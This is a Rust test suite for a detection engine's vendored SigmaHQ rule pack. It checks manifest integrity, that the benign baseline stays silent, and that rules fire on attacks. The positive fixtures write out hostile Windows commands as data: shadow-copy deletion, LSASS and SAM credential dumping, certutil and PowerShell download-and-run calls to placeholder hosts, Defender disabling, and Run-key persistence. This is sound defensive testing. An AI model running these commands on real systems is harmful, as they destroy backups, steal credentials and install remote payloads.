//! The vendored SigmaHQ Audit pack (`rules/sigmahq/`): manifest integrity,
//! every rule compiles in Kestrel, a benign baseline stays silent, and
//! representative attacks fire.

mod common;

use common::*;
use kestrel_common::*;
use kestrel_detect::*;
use serde::Deserialize;
use std::collections::BTreeSet;
use std::path::{Path, PathBuf};

const COMMIT: &str = "e3f466211866e92553d8389d621ed13cfed5523d";

#[derive(Deserialize)]
struct Pack {
    commit: String,
    license: String,
    default_mode: String,
    rules: Vec<PackRule>,
}

#[derive(Deserialize)]
#[allow(dead_code)]
struct PackRule {
    id: String,
    sigma_id: String,
    title: String,
    author: String,
    level: String,
    status: String,
    category: String,
    group: String,
    file: String,
    sha256: String,
    upstream: String,
}

fn pack_dir() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/sigmahq")
}

fn pack() -> Pack {
    let s = std::fs::read_to_string(pack_dir().join("pack.json")).expect("pack.json");
    serde_json::from_str(&s).expect("pack.json parses")
}

fn source(r: &PackRule) -> String {
    std::fs::read_to_string(pack_dir().join(&r.file)).unwrap_or_else(|e| panic!("{}: {e}", r.file))
}

fn bundle() -> RuleBundle {
    let rules = pack()
        .rules
        .iter()
        .map(|r| RuleDef {
            meta: RuleMeta {
                id: r.id.clone(),
                name: r.title.clone(),
                description: String::new(),
                kind: RuleKind::Sigma,
                category: RuleCategory::Custom,
                severity: Severity::High,
                attack: vec![],
                default_mode: RuleMode::Audit,
                protect_day_one: false,
                protect_action: String::new(),
                author: Some(r.author.clone()),
                license: Some("DRL-1.1".into()),
                references: vec![r.upstream.clone()],
                false_positives: vec![],
            },
            source: source(r),
        })
        .collect();
    RuleBundle { version: 1, rules }
}

fn pack_engine() -> Engine {
    Engine::new(host(), Policy::default(), bundle()).expect("pack compiles as one bundle")
}

fn sigma_hits(out: &[Output]) -> Vec<String> {
    alerts(out)
        .iter()
        .filter(|d| d.alert.rule_id.starts_with("SIG-"))
        .map(|d| format!("{} ({})", d.alert.rule_id, d.alert.rule_name))
        .collect()
}

fn yml_files(dir: &Path, out: &mut BTreeSet<String>) {
    for e in std::fs::read_dir(dir).unwrap() {
        let p = e.unwrap().path();
        if p.is_dir() {
            yml_files(&p, out);
        } else if p.extension().is_some_and(|x| x == "yml") {
            let rel = p.strip_prefix(pack_dir()).unwrap();
            out.insert(rel.to_string_lossy().replace('\\', "/"));
        }
    }
}

#[test]
fn manifest_matches_vendored_files() {
    let p = pack();
    assert_eq!(p.commit, COMMIT);
    assert_eq!(p.license, "DRL-1.1");
    assert_eq!(p.default_mode, "audit");
    assert_eq!(p.rules.len(), 70, "pack size");
    let mut on_disk = BTreeSet::new();
    yml_files(&pack_dir().join("rules"), &mut on_disk);
    let listed: BTreeSet<String> = p.rules.iter().map(|r| r.file.clone()).collect();
    assert_eq!(
        on_disk, listed,
        "every vendored YAML is in pack.json and vice versa"
    );
    let ids: BTreeSet<&str> = p.rules.iter().map(|r| r.id.as_str()).collect();
    assert_eq!(ids.len(), p.rules.len(), "unique Kestrel ids");
    for r in &p.rules {
        let uuid8: String = r.sigma_id.replace('-', "").chars().take(8).collect();
        assert_eq!(r.id, format!("SIG-{uuid8}"));
        assert_eq!(
            r.upstream,
            format!("https://github.com/SigmaHQ/sigma/blob/{COMMIT}/{}", r.file)
        );
        assert!(
            !r.author.trim().is_empty(),
            "{}: DRL needs the author",
            r.id
        );
        assert!(["stable", "test"].contains(&r.status.as_str()), "{}", r.id);
        assert!(["high", "critical"].contains(&r.level.as_str()), "{}", r.id);
        let info = validate_sigma(&source(r)).unwrap_or_else(|e| panic!("{}: {e}", r.id));
        assert_eq!(
            info.sigma_id.as_deref(),
            Some(r.sigma_id.as_str()),
            "{}",
            r.id
        );
        assert_eq!(info.title, r.title);
        assert_eq!(info.author.as_deref(), Some(r.author.as_str()));
        assert_eq!(info.category, r.category);
        assert!(info.severity >= Severity::High, "{}", r.id);
    }
    assert!(pack_dir().join("NOTICE.md").exists());
    let notice = std::fs::read_to_string(pack_dir().join("NOTICE.md")).unwrap();
    assert!(notice.contains("Detection Rule License (DRL) 1.1") && notice.contains(COMMIT));
}

#[test]
fn whole_pack_loads_with_mapping_notes() {
    let _ = pack_engine();
    // process_access rules carry the requested-access caveat; rules with
    // ParentImage filters carry the unknown-parent caveat.
    let lsass = pack()
        .rules
        .into_iter()
        .find(|r| r.id == "SIG-9bd012ee")
        .unwrap();
    let info = validate_sigma(&source(&lsass)).unwrap();
    assert!(info.notes.iter().any(|n| n.contains("requested")));
    let evtlog = pack()
        .rules
        .into_iter()
        .find(|r| r.id == "SIG-cc36992a")
        .unwrap();
    let info = validate_sigma(&source(&evtlog)).unwrap();
    assert!(info
        .notes
        .iter()
        .any(|n| n.contains("parent process is unknown")));
}

fn benign_files() -> Vec<PathBuf> {
    let mut v = vec![];
    for dir in [
        Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures"),
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../kestrel-agent/replays"),
    ] {
        let Ok(rd) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in rd {
            let p = e.unwrap().path();
            let name = p.file_name().unwrap().to_string_lossy().to_string();
            if name.starts_with("benign_") && name.ends_with(".jsonl") {
                v.push(p);
            }
        }
    }
    v.sort();
    v
}

fn load(p: &Path) -> Vec<Event> {
    std::fs::read_to_string(p)
        .unwrap()
        .lines()
        .filter(|l| !l.trim().is_empty())
        .map(|l| serde_json::from_str(l).unwrap_or_else(|e| panic!("{}: {e}: {l}", p.display())))
        .collect()
}

#[test]
fn benign_baseline_is_silent() {
    let files = benign_files();
    assert!(
        files.len() >= 5,
        "expected the detect + agent benign fixtures, got {files:?}"
    );
    let mut total = 0;
    for f in &files {
        let events = load(f);
        total += events.len();
        let mut e = pack_engine();
        let out = replay(&mut e, &events);
        let hits = sigma_hits(&out);
        assert!(
            hits.is_empty(),
            "{}: SigmaHQ pack fired on benign activity: {hits:?}",
            f.display()
        );
    }
    assert!(total > 150, "baseline too small: {total} events");
}

// ------------------------------------------------------------ positives

const EXPLORER: &str = r"C:\Windows\explorer.exe";

fn ps(ts: i64, pid: u32, guid: &str, parent: Option<(&str, u32)>, image: &str, cmd: &str) -> Event {
    Event {
        ts,
        pid,
        guid: ProcessGuid(guid.into()),
        data: EventData::ProcessStart(ProcessStart {
            ppid: parent.map(|p| p.1).unwrap_or(3900),
            parent_guid: parent.map(|p| ProcessGuid(p.0.into())),
            image: image.into(),
            cmdline: cmd.into(),
            user: Some(r"CORP\alice".into()),
            integrity: Some(Integrity::High),
            signed: SignatureState::Valid,
            signer: Some("Microsoft Windows".into()),
            ..Default::default()
        }),
    }
}

fn on(ts: i64, pid: u32, guid: &str, data: EventData) -> Event {
    Event {
        ts,
        pid,
        guid: ProcessGuid(guid.into()),
        data,
    }
}

/// Explorer, then `image cmd` as its child.
fn child_of_explorer(image: &str, cmd: &str) -> Vec<Event> {
    vec![
        ps(T0, 4000, "explorer", None, EXPLORER, EXPLORER),
        ps(
            T0 + 100,
            5000,
            "actor",
            Some(("explorer", 4000)),
            image,
            cmd,
        ),
    ]
}

fn fires(rule: &str, events: &[Event]) {
    let mut e = pack_engine();
    let out = replay(&mut e, events);
    let hits = sigma_hits(&out);
    assert!(
        hits.iter().any(|h| h.starts_with(rule)),
        "{rule} did not fire; hits: {hits:?}"
    );
    let d = alerts(&out)
        .into_iter()
        .find(|d| d.alert.rule_id == rule)
        .unwrap();
    // DRL 1.1: messages based on matches keep the author.
    assert!(
        d.alert
            .rule_author
            .as_deref()
            .is_some_and(|a| !a.is_empty()),
        "{rule}: alert lost the Sigma author"
    );
    assert_eq!(d.alert.mode, RuleMode::Audit, "{rule}: pack is Audit only");
}

fn proc_case(rule: &str, image: &str, cmd: &str) {
    fires(rule, &child_of_explorer(image, cmd));
}

const S32: &str = r"C:\Windows\System32\";

fn sys(exe: &str) -> String {
    format!("{S32}{exe}")
}

#[test]
fn ransomware_precursors_fire() {
    proc_case(
        "SIG-c947b146",
        &sys("vssadmin.exe"),
        "vssadmin.exe delete shadows /all /quiet",
    );
    proc_case(
        "SIG-1444443e",
        &sys("bcdedit.exe"),
        "bcdedit.exe /set {default} recoveryenabled no",
    );
    proc_case(
        "SIG-639c9081",
        &sys("wbadmin.exe"),
        "wbadmin.exe delete systemstatebackup -keepVersions:0 -quiet",
    );
    proc_case(
        "SIG-cc36992a",
        &sys("wevtutil.exe"),
        "wevtutil.exe cl System",
    );
}

#[test]
fn credential_dumping_fires() {
    proc_case(
        "SIG-646ea171",
        &sys("rundll32.exe"),
        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Users\Public\l.dmp full",
    );
    proc_case(
        "SIG-5afee48e",
        r"C:\Users\alice\Downloads\procdump64.exe",
        r"procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\l.dmp",
    );
    proc_case(
        "SIG-fd877b94",
        &sys("reg.exe"),
        r"reg.exe save hklm\sam C:\Users\Public\sam.save",
    );
    // LSASS handle from a tool with "dump" in its name.
    let mut ev = child_of_explorer(r"C:\Users\alice\Downloads\nanodump.exe", "nanodump.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::ProcessAccess(TargetProcess {
            target_pid: 820,
            target_guid: None,
            target_image: sys("lsass.exe"),
            granted_access: 0x1fffff,
            return_code: 0,
        }),
    ));
    fires("SIG-9bd012ee", &ev);
    // Unsigned dbghelp shipped next to a dumper.
    let mut ev = child_of_explorer(r"C:\Users\alice\Downloads\tool.exe", "tool.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::ImageLoad {
            path: r"C:\Users\alice\Downloads\dbghelp.dll".into(),
            signer: None,
            signed: SignatureState::Unsigned,
        },
    ));
    fires("SIG-bdc64095", &ev);
}

#[test]
fn lolbins_fire() {
    proc_case(
        "SIG-13e6fe51",
        &sys("certutil.exe"),
        r"certutil.exe -urlcache -split -f http://45.67.89.10/p.exe C:\Users\Public\p.exe",
    );
    proc_case(
        "SIG-b98d0db6",
        &sys("mshta.exe"),
        "mshta.exe https://captcha-check.example/verify.hta",
    );
    proc_case(
        "SIG-2dd2c217",
        &sys("regsvr32.exe"),
        "regsvr32.exe /s /n /u /i:http://45.67.89.10/x.sct scrobj.dll",
    );
    proc_case(
        "SIG-4782eb5a",
        &sys("rundll32.exe"),
        r#"rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://x.example/a")"#,
    );
    // Office spawning PowerShell.
    let ev = vec![
        ps(T0, 4000, "explorer", None, EXPLORER, EXPLORER),
        ps(
            T0 + 100,
            4100,
            "word",
            Some(("explorer", 4000)),
            r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "WINWORD.EXE /n invoice.docm",
        ),
        ps(
            T0 + 200,
            5000,
            "actor",
            Some(("word", 4100)),
            &sys(r"WindowsPowerShell\v1.0\powershell.exe"),
            "powershell.exe -nop -w hidden -c iex(iwr http://x.example/a)",
        ),
    ];
    fires("SIG-438025f9", &ev);
}

#[test]
fn defence_evasion_fires() {
    let pwsh = sys(r"WindowsPowerShell\v1.0\powershell.exe");
    proc_case(
        "SIG-1ec65a5f",
        &pwsh,
        "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true",
    );
    proc_case("SIG-a7ee1722", &sys("sc.exe"), "sc.exe stop WinDefend");
    let mut ev = child_of_explorer(&pwsh, "powershell.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::ScriptBlock {
            engine: "powershell".into(),
            content: "Set-MpPreference -DisableRealtimeMonitoring $true".into(),
        },
    ));
    fires("SIG-14c71865", &ev);
}

#[test]
fn persistence_fires() {
    proc_case(
        "SIG-39019a4e",
        &sys("schtasks.exe"),
        r"schtasks.exe /create /sc once /st 23:59 /tn Updater /tr C:\Users\alice\AppData\Local\Temp\upd.exe",
    );
    // Run key written by a process running from Downloads.
    let mut ev = child_of_explorer(r"C:\Users\alice\Downloads\invoice.exe", "invoice.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::RegistrySet {
            attribution: Default::default(),
            key: r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run".into(),
            value_name: "Updater".into(),
            data: Some(r"C:\Users\alice\AppData\Local\Temp\upd.exe".into()),
            op: RegistryOp::Set,
        },
    ));
    fires("SIG-9c5037d1", &ev);
    // Policies\Explorer\Run pointing into %TEMP%.
    let mut ev = child_of_explorer(&sys("reg.exe"), "reg.exe add");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::RegistrySet {
            attribution: Default::default(),
            key: r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
                .into(),
            value_name: String::new(),
            data: Some(r"C:\Users\alice\AppData\Local\Temp\upd.exe".into()),
            op: RegistryOp::Set,
        },
    ));
    fires("SIG-b7916c2a", &ev);
}

#[test]
fn network_rules_fire() {
    let mut ev = child_of_explorer(r"C:\Users\alice\AppData\Local\Temp\t.exe", "t.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::DnsQuery {
            qname: "abcdefghijklmnop.onion.ly".into(),
            answers: vec![],
        },
    ));
    ev.push(on(
        T0 + 300,
        5000,
        "actor",
        EventData::DnsQuery {
            qname: "abcdefghijklmnop.onion".into(),
            answers: vec![],
        },
    ));
    fires("SIG-b55ca2a3", &ev);
    let mut ev = child_of_explorer(r"C:\Users\alice\AppData\Local\Temp\t.exe", "t.exe");
    ev.push(on(
        T0 + 200,
        5000,
        "actor",
        EventData::NetConnect {
            proto: NetProto::Tcp,
            dst_ip: "3.125.102.39".into(),
            dst_port: 443,
            src_port: 50000,
            dst_host: Some("a1b2-203-0-113-9.ngrok-free.app".into()),
            bytes_sent: None,
        },
    ));
    fires("SIG-18249279", &ev);
}

#[test]
fn unknown_parent_does_not_suppress_pack_rule() {
    // wevtutil `sl` is filtered upstream only when the parent is msiexec. With
    // no parent in the process table the filter cannot apply → alert.
    let ev = vec![ps(
        T0,
        5000,
        "actor",
        Some(("never-seen", 1234)),
        &sys("wevtutil.exe"),
        "wevtutil.exe sl Security /ms:1024",
    )];
    fires("SIG-cc36992a", &ev);
    // Known msiexec parent → upstream filter applies.
    let ev = vec![
        ps(T0, 700, "msi", None, &sys("msiexec.exe"), "msiexec.exe /V"),
        ps(
            T0 + 100,
            5000,
            "actor",
            Some(("msi", 700)),
            &sys("wevtutil.exe"),
            "wevtutil.exe sl Microsoft-RMS-MSIPC/Debug /q:true /e:true",
        ),
    ];
    let mut e = pack_engine();
    let out = replay(&mut e, &ev);
    assert!(sigma_hits(&out).is_empty(), "{:?}", sigma_hits(&out));
}
